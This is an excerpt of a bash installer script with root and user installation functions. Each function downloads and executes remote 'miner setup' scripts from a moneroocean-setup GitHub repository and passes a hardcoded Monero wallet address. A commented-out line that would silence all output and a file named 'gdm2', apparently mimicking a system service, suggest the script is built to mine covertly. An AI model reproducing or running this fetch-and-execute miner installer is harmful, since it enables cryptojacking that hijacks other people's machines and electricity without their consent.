...
# Completely disable bash tracing to prevent '+' output
{
    ...
    # Output redirection removed for visibility
    # exec 2>/dev/null >/dev/null  # <-- COMMENTED OUT to see script output
} 2>/dev/null
...
root_installation() {
    ...
    download_and_execute \
        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_VISIBLE.sh" \
        "$wallet" \
        "root miner setup"
...
user_installation() {
    ...
    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
    download_and_execute \
        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2_VISIBLE.sh" \
        "$wallet" \
        "user miner setup"
